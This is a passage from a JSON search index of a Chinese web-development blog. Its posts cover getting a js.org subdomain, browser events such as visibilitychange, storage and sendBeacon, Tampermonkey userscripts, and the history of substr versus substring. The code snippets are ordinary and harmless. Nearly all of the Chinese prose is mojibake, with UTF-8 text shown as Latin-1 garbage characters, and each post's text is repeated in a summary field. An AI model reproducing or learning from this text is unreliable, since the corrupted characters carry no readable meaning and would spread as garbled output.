çš„è¯·æ±‚ï¼Œå½“è¿™ä¸ªè¯·æ±‚è¢«åˆå¹¶æ—¶ï¼Œä½ å°±æ‹¥æœ‰äº†js.orgçš„äºŒçº§åŸŸåã€‚\n","permalink":"https://wdd.js.org/posts/2018/01/how-to-get-jsorg-sub-domain/","summary":"ä¹‹å‰æˆ‘æ˜¯ä½¿ç”¨wangduanduan.github.ioä½œä¸ºæˆ‘çš„åšå®¢åœ°å€ï¼Œåæ¥è§‰å¾—éº»çƒ¦ï¼Œæœ‰æŠŠåšå®¢å…³äº†ã€‚æœ€è¿‘æœ‰æƒ³å»æŠ˜è…¾æŠ˜è…¾ã€‚ å…ˆçœ‹æ•ˆæœï¼šwdd.js.org\nå¦‚æœä½ ä¸äº†è§£js.orgå¯ä»¥çœ‹çœ‹æˆ‘çš„è¿™ç¯‡æ–‡ç« :ä¸€ä¸ªå€¼å¾—æ‰€æœ‰å‰ç«¯å¼€å‘è€…å…³æ³¨çš„ç½‘ç«™js.org\n1. å‰æ å·²ç»æœ‰äº†github pagesçš„ä¸€ä¸ªåšå®¢ï¼Œå¹¶ä¸”åšå®¢ä¸­æœ‰å†…å®¹ï¼Œæ²¡æœ‰å†…å®¹ä¼šå®¡æ ¸ä¸é€šè¿‡çš„ã€‚æˆ‘ç¬¬ä¸€æ¬¡ç”³è¯·åŸŸåï¼Œå°±æ˜¯å› ä¸ºå†…å®¹å¤ªå°‘è€Œå®¡æ ¸ä¸é€šè¿‡ã€‚ 2. æƒ³å¥½è‡ªå·±è¦ä»€ä¹ˆåŸŸåï¼Ÿ æ¯”å¦‚ä½ æƒ³è¦ä¸€ä¸ªï¼šwdd.js.orgçš„åŸŸåï¼Œä½ å…ˆåœ¨æµè§ˆå™¨é‡Œè®¿é—®è¿™ä¸ªåœ°å€ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰äººç”¨è¿‡ï¼Œå¦‚æœå·²ç»æœ‰äººç”¨è¿‡ï¼Œé‚£ä¹ˆä½ å°±åªèƒ½æƒ³ç‚¹å…¶ä»–çš„åŸŸåäº†ã€‚\n3. fork js.orgçš„é¡¹ç›®ï¼Œæ·»åŠ è‡ªå·±çš„åŸŸå 1 fork https://github.com/js-org/dns.js.org 2 ä¿®æ”¹ä½ forkåçš„ä»“åº“ä¸­çš„cnames_active.jsæ–‡ä»¶ï¼ŒåŠ ä¸Šè‡ªå·±çš„ä¸€æ¡åŸŸåï¼Œæœ€å¥½è¦æŒ‰ç…§å­—æ¯é¡ºåº\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘åœ¨ç¬¬1100è¡ŒåŠ å…¥ã€‚æ³¨æ„ï¼Œä¸è¦åœ¨è¯¥è¡ŒååŠ ä»»ä½•æ³¨é‡Šã€‚\n\u0026#34;wdd\u0026#34;: \u0026#34;wangduanduan.github.io\u0026#34;, 3 commit\n4. åŠ å…¥CNAMEæ–‡ä»¶ æˆ‘æ˜¯ç”¨hexoå’Œnextä¸»é¢˜ä½œä¸ºåšå®¢çš„æ¨¡æ¿ã€‚å…¶ä¸­æˆ‘åœ¨gh-pagesåˆ†æ”¯å†™åšå®¢ï¼Œç„¶åéƒ¨ç½²åˆ°masteråˆ†æ”¯ã€‚\næˆ‘åœ¨æˆ‘çš„gh-pagesåˆ†æ”¯çš„sourceç›®å½•ä¸‹åŠ å…¥CNAMEæ–‡ä»¶, å†…å®¹åªæœ‰ä¸€è¡Œ\nwdd.js.org å°†åšå®¢å†æ¬¡éƒ¨ç½²å¥½ï¼Œå¦‚æœCNAMEç”Ÿæ•ˆçš„è¯ï¼Œä½ å·²ç»æ— æ³•ä»åŸæ¥çš„åœ°å€è®¿é—®ï¼šwangduanduan.github.ioï¼Œ è¿™ä¸ªåšå®¢äº†ã€‚\n5. å‘js.orgé¡¹ç›®å‘èµ·pull-request æ‰¾åˆ°ä½ forkåçš„é¡¹ç›®ï¼Œç‚¹å‡» new pull request, å‘åŸæ¥çš„é¡¹ç›®å‘èµ·è¯·æ±‚ã€‚\nç„¶åä½ å¯ä»¥åœ¨js-org/dns.js.orgé¡¹ç›®çš„pull requestsçœ‹åˆ°ä½ çš„è¯·æ±‚ï¼Œå½“è¿™ä¸ªè¯·æ±‚è¢«åˆå¹¶æ—¶ï¼Œä½ å°±æ‹¥æœ‰äº†js.orgçš„äºŒçº§åŸŸåã€‚","title":"ç»„ç»‡åœ¨å¬å”¤ï¼šå¦‚ä½•å…è´¹è·å–ä¸€ä¸ªjs.orgçš„äºŒçº§åŸŸå"},{"content":"1. visibilitychangeäº‹ä»¶ è§¦å‘æ¡ä»¶ï¼šæµè§ˆå™¨æ ‡ç­¾é¡µè¢«éšè—æˆ–æ˜¾ç¤ºçš„æ—¶å€™ä¼šè§¦å‘visibilitychangeäº‹ä»¶.\nä½¿ç”¨åœºæ™¯ï¼šå½“æ ‡ç­¾é¡µæ˜¾ç¤ºæˆ–è€…éšè—æ—¶ï¼Œè§¦å‘ä¸€äº›ä¸šåŠ¡é€»è¾‘\ndocument.addEventListener(\u0026#34;visibilitychange\u0026#34;, function() { console.log( document.visibilityState ); }); 2. storageäº‹ä»¶ è§¦å‘æ¡ä»¶ï¼šä½¿ç”¨localStorage or sessionStorageå­˜å‚¨æˆ–è€…ä¿®æ”¹æŸä¸ªæœ¬åœ°å­˜å‚¨æ—¶\nä½¿ç”¨åœºæ™¯ï¼šæ ‡ç­¾é¡µé—´é€šä¿¡\n// ABé¡µé¢åŒæº // åœ¨A é¡µé¢ window.addEventListener(\u0026#39;storage\u0026#39;, (e) =\u0026gt; {console.log(e)}) // åœ¨B é¡µé¢ï¼Œå‘120æ‰“ä¸ªç”µè¯ localStorage.setItem(\u0026#39;makeCall\u0026#39;,\u0026#39;120\u0026#39;) // ç„¶åå¯ä»¥åœ¨Aé¡µé¢é—´æœ‰è¾“å‡º, å¯ä»¥çœ‹å‡ºAé¡µé¢ æ”¶åˆ°äº†Bé¡µé¢çš„é€šçŸ¥ ...key: \u0026#34;makeCall\u0026#34;, oldValue: \u0026#34;119\u0026#34;, newValue: \u0026#34;120\u0026#34;, ... 3. beforeunloadäº‹ä»¶ è§¦å‘æ¡ä»¶ï¼šå½“é¡µé¢çš„èµ„æºå°†è¦å¸è½½(åŠåˆ·æ–°æˆ–è€…å…³é—­æ ‡ç­¾é¡µå‰). å½“é¡µé¢ä¾ç„¶å¯è§ï¼Œå¹¶ä¸”è¯¥äº‹ä»¶å¯ä»¥è¢«å–æ¶ˆåªæ—¶\nä½¿ç”¨åœºæ™¯ï¼šå…³é—­æˆ–è€…åˆ·æ–°é¡µé¢æ—¶å¼¹çª—ç¡®è®¤ï¼Œå…³é—­é¡µé¢æ—¶å‘åç«¯å‘é€æŠ¥å‘Šç­‰\nwindow.addEventListener(\u0026#34;beforeunload\u0026#34;, function (e) { var confirmationMessage = \u0026#34;\\o/\u0026#34;; e.returnValue = confirmationMessage; // Gecko, Trident, Chrome 34+ return confirmationMessage; // Gecko, WebKit, Chrome \u0026lt;34 }); 4. navigator.sendBeacon è¿™ä¸ªæ–¹æ³•ä¸»è¦ç”¨äºæ»¡è¶³ ç»Ÿè®¡å’Œè¯Šæ–­ä»£ç  çš„éœ€è¦ï¼Œè¿™äº›ä»£ç é€šå¸¸å°è¯•åœ¨å¸è½½ï¼ˆunloadï¼‰æ–‡æ¡£ä¹‹å‰å‘webæœåŠ¡å™¨å‘é€æ•°æ®ã€‚è¿‡æ—©çš„å‘é€æ•°æ®å¯èƒ½å¯¼è‡´é”™è¿‡æ”¶é›†æ•°æ®çš„æœºä¼šã€‚ç„¶è€Œï¼Œ å¯¹äºå¼€å‘è€…æ¥è¯´ä¿è¯åœ¨æ–‡æ¡£å¸è½½æœŸé—´å‘é€æ•°æ®ä¸€ç›´æ˜¯ä¸€ä¸ªå›°éš¾ã€‚å› ä¸ºç”¨æˆ·ä»£ç†é€šå¸¸ä¼šå¿½ç•¥åœ¨å¸è½½äº‹ä»¶å¤„ç†å™¨ä¸­äº§ç”Ÿçš„å¼‚æ­¥ XMLHttpRequest ã€‚\nä½¿ç”¨ sendBeacon() æ–¹æ³•ï¼Œå°†ä¼šä½¿ç”¨æˆ·ä»£ç†åœ¨æœ‰æœºä¼šæ—¶å¼‚æ­¥åœ°å‘æœåŠ¡å™¨å‘é€æ•°æ®ï¼ŒåŒæ—¶ä¸ä¼šå»¶è¿Ÿé¡µé¢çš„å¸è½½æˆ–å½±å“ä¸‹ä¸€å¯¼èˆªçš„è½½å…¥æ€§èƒ½ã€‚è¿™å°±è§£å†³äº†æäº¤åˆ†ææ•°æ®æ—¶çš„æ‰€æœ‰çš„é—®é¢˜ï¼šä½¿å®ƒå¯é ï¼Œå¼‚æ­¥å¹¶ä¸”ä¸ä¼šå½±å“ä¸‹ä¸€é¡µé¢çš„åŠ è½½ã€‚æ­¤å¤–ï¼Œä»£ç å®é™…ä¸Šè¿˜è¦æ¯”å…¶ä»–æŠ€æœ¯ç®€å•ï¼\næ³¨æ„ï¼šè¯¥æ–¹æ³•åœ¨IEå’Œsafariæ²¡æœ‰å®ç°\nä½¿ç”¨åœºæ™¯ï¼šå‘é€å´©æºƒæŠ¥å‘Š\nwindow.addEventListener(\u0026#39;unload\u0026#39;, logData, false); function logData() { navigator.sendBeacon(\u0026#34;/log\u0026#34;, analyticsData); } ","permalink":"https://wdd.js.org/posts/2018/01/browser-events/","summary":"1. visibilitychangeäº‹ä»¶ è§¦å‘æ¡ä»¶ï¼šæµè§ˆå™¨æ ‡ç­¾é¡µè¢«éšè—æˆ–æ˜¾ç¤ºçš„æ—¶å€™ä¼šè§¦å‘visibilitychangeäº‹ä»¶.\nä½¿ç”¨åœºæ™¯ï¼šå½“æ ‡ç­¾é¡µæ˜¾ç¤ºæˆ–è€…éšè—æ—¶ï¼Œè§¦å‘ä¸€äº›ä¸šåŠ¡é€»è¾‘\ndocument.addEventListener(\u0026#34;visibilitychange\u0026#34;, function() { console.log( document.visibilityState ); }); 2. storageäº‹ä»¶ è§¦å‘æ¡ä»¶ï¼šä½¿ç”¨localStorage or sessionStorageå­˜å‚¨æˆ–è€…ä¿®æ”¹æŸä¸ªæœ¬åœ°å­˜å‚¨æ—¶\nä½¿ç”¨åœºæ™¯ï¼šæ ‡ç­¾é¡µé—´é€šä¿¡\n// ABé¡µé¢åŒæº // åœ¨A é¡µé¢ window.addEventListener(\u0026#39;storage\u0026#39;, (e) =\u0026gt; {console.log(e)}) // åœ¨B é¡µé¢ï¼Œå‘120æ‰“ä¸ªç”µè¯ localStorage.setItem(\u0026#39;makeCall\u0026#39;,\u0026#39;120\u0026#39;) // ç„¶åå¯ä»¥åœ¨Aé¡µé¢é—´æœ‰è¾“å‡º, å¯ä»¥çœ‹å‡ºAé¡µé¢ æ”¶åˆ°äº†Bé¡µé¢çš„é€šçŸ¥ ...key: \u0026#34;makeCall\u0026#34;, oldValue: \u0026#34;119\u0026#34;, newValue: \u0026#34;120\u0026#34;, ... 3. beforeunloadäº‹ä»¶ è§¦å‘æ¡ä»¶ï¼šå½“é¡µé¢çš„èµ„æºå°†è¦å¸è½½(åŠåˆ·æ–°æˆ–è€…å…³é—­æ ‡ç­¾é¡µå‰). å½“é¡µé¢ä¾ç„¶å¯è§ï¼Œå¹¶ä¸”è¯¥äº‹ä»¶å¯ä»¥è¢«å–æ¶ˆåªæ—¶\nä½¿ç”¨åœºæ™¯ï¼šå…³é—­æˆ–è€…åˆ·æ–°é¡µé¢æ—¶å¼¹çª—ç¡®è®¤ï¼Œå…³é—­é¡µé¢æ—¶å‘åç«¯å‘é€æŠ¥å‘Šç­‰\nwindow.addEventListener(\u0026#34;beforeunload\u0026#34;, function (e) { var confirmationMessage = \u0026#34;\\o/\u0026#34;; e.returnValue = confirmationMessage; // Gecko, Trident, Chrome 34+ return confirmationMessage; // Gecko, WebKit, Chrome \u0026lt;34 }); 4.","title":"ä¸å¸¸ç”¨å´å¾ˆæœ‰å¦™ç”¨çš„äº‹ä»¶åŠæ–¹æ³•"},{"content":" å½“ä½ ç”¨æµè§ˆå™¨è®¿é—®æŸä¸ªç½‘é¡µæ—¶ï¼Œä½ å¯æ›¾æƒ³è¿‡ï¼Œä½ çœ‹åˆ°çš„è¿™ä¸ªç½‘é¡µï¼Œå®é™…ä¸Šæ˜¯å±äºä½ è‡ªå·±çš„ã€‚\næ‰“ä¸ªæ¯”å–»ï¼šè®¿é—®æŸä¸ªç½‘ç«™å°±å¥½åƒæ˜¯ç½‘è´­äº†ä¸€ç­é¸¡è›‹ï¼Œé¸¡è›‹è™½ç„¶æ˜¯å…»é¸¡åœºç”Ÿäº§çš„ï¼Œä½†æ˜¯è¿™ä¸ªè›‹æˆ‘æ€ä¹ˆåƒï¼Œä½ å…»é¸¡åœºç®¡ä¸ç€ã€‚\nå½“ç„¶äº†ï¼Œå¯¹äºå¾ˆå¤šäººæ¥è¯´ï¼Œé¸¡è›‹æ²¡æœ‰åˆ«çš„åƒæ³•ï¼Œé¸¡è›‹åªèƒ½ç…®ç€åƒã€‚\nä½ å¯ä»¥çœ‹å¦‚ä¸‹çš„é¡µé¢ï¼šå½“ä½ åœ¨æŸæœç´¢å¼•æ“ä¸Šæœç´¢å‰ç«¯å¼€å‘æ—¶\nå¤§å¤šæ•°äººçœ‹åˆ°çš„é¡µé¢æ˜¯è¿™æ ·çš„, æ»¡å±çš„å¹¿å‘Šï¼Œæ»¡å±çš„æ¨å¹¿ï¼Œæ»¡å±çš„æ’åï¼Œæ»¡å±çš„ä¸­é—´åœ°å€è·³è½¬ï¼Œæ»¡å±çš„æµé‡åŠ«æŒ, è¿˜æœ‰è†ç”°ç³»\nä½†æ˜¯æœ‰äº›äººçš„é¡µé¢å´æ˜¯è¿™æ ·çš„ï¼šæ¸…æ™°ï¼Œè‡ªç„¶ï¼Œé“¾æ¥ç›´è¾¾ï¼Œæ¸…æ°´å‡ºèŠ™è“‰ï¼Œå¤©ç„¶å»é›•é¥° è¿™å°±æ˜¯æ²¹çŒ´å­è„šæœ¬å¹²çš„äº‹æƒ…ï¼Œ å½“ç„¶ï¼Œå®ƒèƒ½å¹²çš„äº‹æƒ…ï¼Œè¿œä¸æ­¢å¦‚æ­¤ã€‚å®ƒæ˜¯é½å¤©å¤§åœ£å­™æ‚Ÿç©ºï¼Œæœ‰ä¸ƒåäºŒå˜ã€‚\n1. ä»€ä¹ˆæ˜¯æ²¹çŒ´å­è„šæœ¬ï¼Ÿ Greasemonkeyï¼Œç®€ç§°GMï¼Œä¸­æ–‡ä¿—ç§°ä¸ºâ€œæ²¹çŒ´â€ï¼Œæ˜¯Firefoxçš„ä¸€ä¸ªé™„åŠ ç»„ä»¶ã€‚å®ƒè®©ç”¨æˆ·å®‰è£…ä¸€äº›è„šæœ¬ä½¿å¤§éƒ¨åˆ†HTMLä¸ºä¸»çš„ç½‘é¡µäºç”¨æˆ·ç«¯ç›´æ¥æ”¹å˜å¾—æ›´æ–¹ä¾¿æ˜“ç”¨ã€‚éšç€Greasemonkeyè„šæœ¬å¸¸é©»äºæµè§ˆå™¨ï¼Œæ¯æ¬¡éšç€ç›®çš„ç½‘é¡µæ‰“å¼€è€Œè‡ªåŠ¨åšä¿®æ”¹ï¼Œä½¿å¾—è¿è¡Œè„šæœ¬çš„ç”¨æˆ·å°è±¡æ·±åˆ»åœ°äº«å—å…¶å›ºå®šä¾¿åˆ©æ€§ã€‚\nGreasemonkeyå¯æ›¿ç½‘é¡µåŠ å…¥äº›æ–°åŠŸèƒ½ï¼ˆä¾‹å¦‚åœ¨äºšé©¬é€Šä¹¦åº—åµŒå…¥å•†å“æ¯”ä»·åŠŸèƒ½ï¼‰ã€ä¿®æ­£ç½‘é¡µé”™è¯¯ã€ç»„åˆæ¥è‡ªä¸åŒç½‘é¡µçš„æ•°æ®ã€æˆ–è€…æ•°ç¹ä¸åŠå¤‡è½½çš„å…¶ä»–åŠŸèƒ½ã€‚å†™çš„å¥½çš„Greasemonkeyè„šæœ¬ç”šè‡³å¯è®©å…¶è¾“å‡ºä¸è¢«ä¿®æ”¹çš„é¡µé¢é›†æˆå¾—å¤©è¡£æ— ç¼ï¼Œåƒæ˜¯åŸæœ¬ç½‘é¡µé‡Œçš„ä¸€éƒ¨åˆ†ã€‚ æ¥è‡ªç»´åŸºç™¾ç§‘\n2. å¦‚ä½•å®‰è£…æ²¹çŒ´å­æ’ä»¶ï¼Ÿ åœ¨googleå•†åº—æœç´¢Tampermonkey, å®‰è£…é‡æœ€é«˜çš„å°±æ˜¯å®ƒã€‚\n3. å¦‚ä½•å†™æ²¹çŒ´å­è„šæœ¬ï¼Ÿ æ²¹çŒ´å­è„šæœ¬æœ‰ä¸ªæ–°å»ºè„šæœ¬é¡µé¢ï¼Œåœ¨æ­¤é¡µé¢å¯ä»¥åˆ›å»ºè„šæœ¬ã€‚å…·ä½“æ•™ç¨‹å¯ä»¥å‚è€ƒã€‚\nä¸­æ–‡ GreaseMonkey ç”¨æˆ·è„šæœ¬å¼€å‘æ‰‹å†Œ GreaseMonkeyï¼ˆæ²¹çŒ´å­ï¼‰è„šæœ¬å¼€å‘ æ·±å…¥æµ…å‡º Greasemonkey Greasemonkey Hacks/Getting Started 4. å¦‚ä½•ä½¿ç”¨ä»–äººçš„è„šæœ¬ï¼Ÿ greasyforkç½‘ç«™æä¾›å¾ˆå¤šè„šæœ¬ï¼Œå®ƒä»¿ä½›æ˜¯ä»£ç ç•Œçš„github, å¯ä»¥åœ¨è¯¥ç½‘ç«™æœåˆ°å¾ˆå¤šæœ‰æ„æ€çš„è„šæœ¬ã€‚\n5. æœ‰å“ªäº›å¥½ç”¨çš„è„šæœ¬ï¼Ÿ æœ‰å“ªäº›è¶…ç¥çš„æ²¹çŒ´è„šæœ¬?\næˆ–è€…ä½ å¯ä»¥åœ¨greasyforkç½‘ç«™æŸ¥çœ‹ä¸€äº›ä¸‹è½½é‡æ’è¡Œ\n","permalink":"https://wdd.js.org/posts/2018/01/tampermonkey/","summary":"å½“ä½ ç”¨æµè§ˆå™¨è®¿é—®æŸä¸ªç½‘é¡µæ—¶ï¼Œä½ å¯æ›¾æƒ³è¿‡ï¼Œä½ çœ‹åˆ°çš„è¿™ä¸ªç½‘é¡µï¼Œå®é™…ä¸Šæ˜¯å±äºä½ è‡ªå·±çš„ã€‚\næ‰“ä¸ªæ¯”å–»ï¼šè®¿é—®æŸä¸ªç½‘ç«™å°±å¥½åƒæ˜¯ç½‘è´­äº†ä¸€ç­é¸¡è›‹ï¼Œé¸¡è›‹è™½ç„¶æ˜¯å…»é¸¡åœºç”Ÿäº§çš„ï¼Œä½†æ˜¯è¿™ä¸ªè›‹æˆ‘æ€ä¹ˆåƒï¼Œä½ å…»é¸¡åœºç®¡ä¸ç€ã€‚\nå½“ç„¶äº†ï¼Œå¯¹äºå¾ˆå¤šäººæ¥è¯´ï¼Œé¸¡è›‹æ²¡æœ‰åˆ«çš„åƒæ³•ï¼Œé¸¡è›‹åªèƒ½ç…®ç€åƒã€‚\nä½ å¯ä»¥çœ‹å¦‚ä¸‹çš„é¡µé¢ï¼šå½“ä½ åœ¨æŸæœç´¢å¼•æ“ä¸Šæœç´¢å‰ç«¯å¼€å‘æ—¶\nå¤§å¤šæ•°äººçœ‹åˆ°çš„é¡µé¢æ˜¯è¿™æ ·çš„, æ»¡å±çš„å¹¿å‘Šï¼Œæ»¡å±çš„æ¨å¹¿ï¼Œæ»¡å±çš„æ’åï¼Œæ»¡å±çš„ä¸­é—´åœ°å€è·³è½¬ï¼Œæ»¡å±çš„æµé‡åŠ«æŒ, è¿˜æœ‰è†ç”°ç³»\nä½†æ˜¯æœ‰äº›äººçš„é¡µé¢å´æ˜¯è¿™æ ·çš„ï¼šæ¸…æ™°ï¼Œè‡ªç„¶ï¼Œé“¾æ¥ç›´è¾¾ï¼Œæ¸…æ°´å‡ºèŠ™è“‰ï¼Œå¤©ç„¶å»é›•é¥° è¿™å°±æ˜¯æ²¹çŒ´å­è„šæœ¬å¹²çš„äº‹æƒ…ï¼Œ å½“ç„¶ï¼Œå®ƒèƒ½å¹²çš„äº‹æƒ…ï¼Œè¿œä¸æ­¢å¦‚æ­¤ã€‚å®ƒæ˜¯é½å¤©å¤§åœ£å­™æ‚Ÿç©ºï¼Œæœ‰ä¸ƒåäºŒå˜ã€‚\n1. ä»€ä¹ˆæ˜¯æ²¹çŒ´å­è„šæœ¬ï¼Ÿ Greasemonkeyï¼Œç®€ç§°GMï¼Œä¸­æ–‡ä¿—ç§°ä¸ºâ€œæ²¹çŒ´â€ï¼Œæ˜¯Firefoxçš„ä¸€ä¸ªé™„åŠ ç»„ä»¶ã€‚å®ƒè®©ç”¨æˆ·å®‰è£…ä¸€äº›è„šæœ¬ä½¿å¤§éƒ¨åˆ†HTMLä¸ºä¸»çš„ç½‘é¡µäºç”¨æˆ·ç«¯ç›´æ¥æ”¹å˜å¾—æ›´æ–¹ä¾¿æ˜“ç”¨ã€‚éšç€Greasemonkeyè„šæœ¬å¸¸é©»äºæµè§ˆå™¨ï¼Œæ¯æ¬¡éšç€ç›®çš„ç½‘é¡µæ‰“å¼€è€Œè‡ªåŠ¨åšä¿®æ”¹ï¼Œä½¿å¾—è¿è¡Œè„šæœ¬çš„ç”¨æˆ·å°è±¡æ·±åˆ»åœ°äº«å—å…¶å›ºå®šä¾¿åˆ©æ€§ã€‚\nGreasemonkeyå¯æ›¿ç½‘é¡µåŠ å…¥äº›æ–°åŠŸèƒ½ï¼ˆä¾‹å¦‚åœ¨äºšé©¬é€Šä¹¦åº—åµŒå…¥å•†å“æ¯”ä»·åŠŸèƒ½ï¼‰ã€ä¿®æ­£ç½‘é¡µé”™è¯¯ã€ç»„åˆæ¥è‡ªä¸åŒç½‘é¡µçš„æ•°æ®ã€æˆ–è€…æ•°ç¹ä¸åŠå¤‡è½½çš„å…¶ä»–åŠŸèƒ½ã€‚å†™çš„å¥½çš„Greasemonkeyè„šæœ¬ç”šè‡³å¯è®©å…¶è¾“å‡ºä¸è¢«ä¿®æ”¹çš„é¡µé¢é›†æˆå¾—å¤©è¡£æ— ç¼ï¼Œåƒæ˜¯åŸæœ¬ç½‘é¡µé‡Œçš„ä¸€éƒ¨åˆ†ã€‚ æ¥è‡ªç»´åŸºç™¾ç§‘\n2. å¦‚ä½•å®‰è£…æ²¹çŒ´å­æ’ä»¶ï¼Ÿ åœ¨googleå•†åº—æœç´¢Tampermonkey, å®‰è£…é‡æœ€é«˜çš„å°±æ˜¯å®ƒã€‚\n3. å¦‚ä½•å†™æ²¹çŒ´å­è„šæœ¬ï¼Ÿ æ²¹çŒ´å­è„šæœ¬æœ‰ä¸ªæ–°å»ºè„šæœ¬é¡µé¢ï¼Œåœ¨æ­¤é¡µé¢å¯ä»¥åˆ›å»ºè„šæœ¬ã€‚å…·ä½“æ•™ç¨‹å¯ä»¥å‚è€ƒã€‚\nä¸­æ–‡ GreaseMonkey ç”¨æˆ·è„šæœ¬å¼€å‘æ‰‹å†Œ GreaseMonkeyï¼ˆæ²¹çŒ´å­ï¼‰è„šæœ¬å¼€å‘ æ·±å…¥æµ…å‡º Greasemonkey Greasemonkey Hacks/Getting Started 4. å¦‚ä½•ä½¿ç”¨ä»–äººçš„è„šæœ¬ï¼Ÿ greasyforkç½‘ç«™æä¾›å¾ˆå¤šè„šæœ¬ï¼Œå®ƒä»¿ä½›æ˜¯ä»£ç ç•Œçš„github, å¯ä»¥åœ¨è¯¥ç½‘ç«™æœåˆ°å¾ˆå¤šæœ‰æ„æ€çš„è„šæœ¬ã€‚\n5. æœ‰å“ªäº›å¥½ç”¨çš„è„šæœ¬ï¼Ÿ æœ‰å“ªäº›è¶…ç¥çš„æ²¹çŒ´è„šæœ¬?\næˆ–è€…ä½ å¯ä»¥åœ¨greasyforkç½‘ç«™æŸ¥çœ‹ä¸€äº›ä¸‹è½½é‡æ’è¡Œ","title":"æ²¹çŒ´å­è„šæœ¬ - æˆ‘çš„åœ°ç›˜æˆ‘åšä¸»"},{"content":" å¼•å­ï¼š å¾ˆå¤šæ—¶å€™ï¼Œå½“æˆ‘è¦å­—ç¬¦ä¸²æˆªå–æ—¶ï¼Œæˆ‘ä¼šæƒ³åˆ°substrå’Œsubstringçš„æ–¹æ³•ï¼Œä½†æ˜¯å…·ä½“è¦æ€ä¹ˆä¼ å‚æ•°æ—¶ï¼Œæˆ‘æ€»æ˜¯è®°ä¸ä½ã€‚å“ªä¸ªåº”è¯¥ä¼ ä¸ªå­—ç¬¦ä¸²é•¿åº¦ï¼Œå“ªä¸ªåˆåº”è¯¥ä¼ ä¸ªå¼€å§‹å’Œç»“å°¾çš„ä¸‹æ ‡ï¼Œå¦‚æœæˆ‘ä¸å»æŸ¥æŸ¥è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œæˆ‘å§‹ç»ˆä¸æ•¢å»ä½¿ç”¨å®ƒä»¬ã€‚æ‰€ä»¥æˆ‘æ€»æ˜¯è§‰å¾—ï¼Œè¿™ä¸ªä¸¤ä¸ªæ–¹æ³•åèµ·çš„çœŸæ˜¯è¹©è„šã€‚ç„¶è€Œäº‹å®æ˜¯è¿™æ ·çš„å—ï¼Ÿ\nçœ‹æ¥æ˜¯æ—¶å€™æ‰’ä¸€æ‰’è¿™ä¸¤ä¸ªæ–¹æ³•çš„å†å²äº†ã€‚\n1. åŸºå› è¿½æœ¬æº¯æº åœ¨ç¼–ç¨‹è¯­è¨€çš„å†å²é•¿æ²³ä¸­ï¼Œæ›¾ç»å‡ºç°è¿‡å¾ˆå¤šç¼–ç¨‹è¯­è¨€ã€‚ç„¶è€Œå¤§æµªæ·˜æ²™ï¼Œé“…åæ´—å°½ä¹‹åï¼Œå¾ˆå¤šæ—©å·²æŠ˜æˆŸæ²‰æ²™ï¼Œæœ‰äº›å´ä¾æ—§å…‰å½©å¤ºç›®ã€‚é‚£ä¹ˆstubsträ¸substringçš„DNAç©¶ç«Ÿæ¥è‡ªä½•å¤„ï¼Ÿ\n1950ä¸1960å¹´ä»£\n1954 - FORTRAN 1958 - LISP 1959 - COBOL 1964 - BASIC 1970 - Pascal 1967-1978ï¼šç¡®ç«‹äº†åŸºç¡€èŒƒå¼\n1972 - Cè¯­è¨€ 1975 - Scheme 1978 - SQL (èµ·å…ˆåªæ˜¯ä¸€ç§æŸ¥è¯¢è¯­è¨€ï¼Œæ‰©å……ä¹‹åä¹Ÿå…·å¤‡äº†ç¨‹åºç»“æ„) 1980å¹´ä»£ï¼šå¢å¼ºã€æ¨¡å—ã€æ€§èƒ½\n1983 - C++ (å°±åƒæœ‰ç±»åˆ«çš„C) 1988 - Tcl 1990å¹´ä»£ï¼šäº’è”ç½‘æ—¶ä»£\n1991 - Python 1991 - Visual Basic 1993 - Ruby 1995 - Java 1995 - Delphi (Object Pascal) 1995 - JavaScript 1995 - PHP 2009 - Go 2014 - Swift (ç¼–ç¨‹è¯­è¨€) 1.1. åœ¨C++ä¸­é¦–æ¬¡å‡ºç°substr() åœ¨cè¯­è¨€ä¸­ï¼Œå¹¶æ²¡æœ‰å‡ºç°substræˆ–è€…substringæ–¹æ³•ã€‚ç„¶è€Œåœ¨1983ï¼Œsubstr()æ–¹æ³•å·²ç»å‡ºç°åœ¨C++è¯­è¨€ä¸­äº†ã€‚ç„¶è€Œè¿™æ—¶å€™è¿˜æ²¡æœ‰å‡ºç°substring, æ‰€ä»¥å¯ä»¥è§å¾—ï¼šsubstræ˜¯stustringçš„è€å¤§å“¥\nstring substr (size_t pos = 0, size_t len = npos) const; ä»C++çš„æ–¹æ³•å®šä¹‰ä¸­å¯ä»¥çœ‹åˆ°, substrçš„å‚æ•°æ˜¯å¼€å§‹ä¸‹æ ‡ï¼Œä»¥åŠå­—ç¬¦ä¸²é•¿åº¦ã€‚\nstd::string str=\u0026#34;We think in generalities, but we live in details.\u0026#34;; std::string str2 = str.substr (3,5); // \u0026#34;think\u0026#34; 1.2. åœ¨Javaä¸­é¦–æ¬¡å‡ºç°substring() è·ç¦»substr()æ–¹æ³•å‡ºç°å·²ç»æœ‰äº†å°†è¿‘åå¹´ä¹‹éš”ï¼Œæ­¤é—´æ¶Œç°ä¸€æ‰¹åèµ·ä¹‹ç§€ï¼Œå¦‚: Python, Ruby, VBä¹‹ç±»ï¼Œç„¶è€Œä»–ä»¬ä¹‹ä¸­å¹¶æ²¡æœ‰stustringçš„åŸºå› ï¼Œåœ¨Javaçš„Stringç±»ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°ä¸¤ä¸ªæ–¹æ³•ã€‚ä»è¿™ä¸¤ä¸ªæ–¹æ³•ä¹‹ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼šsubstringæ–¹æ³•åŸºæœ¬åŸå‹çš„å‚æ•°æ˜¯å¼€å§‹å’Œç»“æŸçš„ä¸‹æ ‡ã€‚\nString substring(int beginIndex) // è¿”å›ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œå®ƒæ˜¯æ­¤å­—ç¬¦ä¸²çš„ä¸€ä¸ªå­å­—ç¬¦ä¸²ã€‚ String substring(int beginIndex, int endIndex) // è¿”å›ä¸€ä¸ªæ–°å­—ç¬¦ä¸²ï¼Œå®ƒæ˜¯æ­¤å­—ç¬¦ä¸²çš„ä¸€ä¸ªå­å­—ç¬¦ä¸²ã€‚ 2. JavaScriptçš„å†å²ç»§æ‰¿ 1995å¹´ï¼Œç½‘æ™¯å…¬å¸æ‹›å‹Ÿäº†Brendan Eichï¼Œç›®çš„æ˜¯å°†Schemeç¼–ç¨‹è¯­è¨€åµŒå…¥åˆ°Netscape Navigatorä¸­ã€‚åœ¨å¼€å§‹ä¹‹å‰ï¼ŒNetscape 